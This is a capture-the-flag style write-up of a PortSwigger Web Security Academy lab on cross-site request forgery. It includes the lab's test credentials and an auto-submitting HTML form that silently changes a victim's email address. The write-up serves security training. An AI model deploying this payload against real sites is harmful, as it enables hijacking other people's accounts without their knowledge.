# [Lab: CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)

## Lab

This lab's email change functionality is vulnerable to CSRF.

To solve the lab, craft some HTML that uses a CSRF attack to change the viewer's email address and upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`

## Analysis

No csrf token

## Solution

```html
<html>
    <body>
        <form action="https://id.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="email" value="hacked@gmail.com" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```
